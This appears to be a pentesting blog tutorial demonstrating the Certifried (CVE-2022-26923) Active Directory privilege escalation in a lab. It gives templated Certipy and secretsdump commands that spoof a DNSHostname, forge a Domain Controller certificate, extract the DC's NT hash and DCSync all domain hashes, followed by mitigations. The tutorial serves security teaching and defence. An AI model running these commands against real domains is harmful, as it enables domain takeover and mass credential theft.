---
layout: post
title:  "AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)"
---

![Certifried-diagram](/assets/Certifried/Certifried-diagram.jpg)

# The Attack In Brief
1. AD Certificates can be used for authentication.
2. Certificates can be generated from **templates** in a **Certificate Signing Request** (CSR).
3. There are **two** types of templates available in **ADCS** by default: User and Computer.
4. Those templates are **accessible to anyone** in the `Domain Users` or `Domain Computers` groups.
5. Those templates **allow the certificate holder to authenticate** with them.
6. *When generating a certificate for a computer object*, the template will check its `DNSHostname` property and **will generate the certificate based on that**.
7. **Meaning:** *if the computer's* `DNSHostname` *says it's a Domain Controller,* you will get a certificate for a **Domain Controller!**
8. *By default,* **any authenticated user** can join up to 10 computers to the domain.
9. *When a user joins a computer to the domain,* he can modify its `DNSHostname` property.
10. *Combining points above,* a user can *spoof* the `DNSHostname` to *forge* a certificate as a **Domain Controller**.
11. *With a Domain Controller's certificate,* the user *can obtain* the computer account's **NTLM** hash.
12. *And with that hash,* he can *impersonate* a legit **Domain Controller** and *request a full copy of the domain's hashes* (a.k.a **perform a `DCSync` attack**).

---

# Tools Needed
1. [Certipy](https://github.com/ly4k/Certipy)
2. [Impacket](https://github.com/SecureAuthCorp/impacket)

---

# Lab Setup And Conditions
## 1. Domain Controller with ADCS Role installed [DC.LAB.Local: 192.168.126.129]
![dc-with-adcs-installed](/assets/Certifried/dc-with-adcs-installed.jpg)

## 2. Kali [192.168.145.128]
![kali-machine](/assets/Certifried/kali-machine.jpg)

## 3. Normal User Account (No Special Privileges)
![normal-ad-user](/assets/Certifried/normal-ad-user.jpg)

---

# Attack Demonstration
## 1. Joining A Machine Account to The Domain with A Spoofed DNSHostname
**Command:** `certipy account create <DOMAIN_FQDN>/<AD_USER>@<DC_IP> -user '<NEW_COMPUTER_NAME>' -dns <DC_FQDN>`

![creating-computer-with-spoofed-dns-hostname](/assets/Certifried/creating-computer-with-spoofed-dns-hostname.jpg)

![proof-of-dns-hostname-spoofing](/assets/Certifried/proof-of-dns-hostname-spoofing.jpg)

## 2. Requesting A Domain Controller's Certificate
we must first obtain the certificate authority's name.

This can be done by visiting the `/certsrv` web directory on the server with ADCS installed and authenticating.

![finding-out-the-ca-name](/assets/Certifried/finding-out-the-ca-name.jpg)

**Command:** `certipy req -dc-ip <DC_IP> <DOMAIN_FQDN>/'<ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -ca <CA_NAME> -template Machine`

Pssword = the same password generated from the computer creation in the previous step

![requesting-dc-cert](/assets/Certifried/requesting-dc-cert.jpg)

## 3. Using the Domain Controller's Certificate To Get its NTLM Hash
**Command:** `certipy auth -pfx <GENERATED_PFX_CERTIFICATE>`

![got-nt-hash-for-dc](/assets/Certifried/got-nt-hash-for-dc.jpg)

## 4. Performing DCsync As The Impersonated Domain Controller
**Command:** `secretsdump.py -just-dc <DOMAIN_FQDN>/'<DC_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -hashes :<RETRIEVED_HASH>`

![dc-sync-with-dc-ntlm-hash](/assets/Certifried/dc-sync-with-dc-ntlm-hash.jpg)

---

# Mitigation
1. Applying the patch released by Microsoft [here](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923).
2. Reducing certificate template permissions.
3. Reducing the default user's machine quota to zero. Only Administrators should have this privilege.

---

# References and Credits
- **Will Schroeder** and **Lee Christensen** who wrote the paper that started it all [here](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [Oliver Lyak](https://twitter.com/ly4k_) who discovered, reported and explained the vulnerability [here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) as well as created the `Certipy` tool.
- **SecureAuthCorp** for the awesome **Impacket** scripts of course :D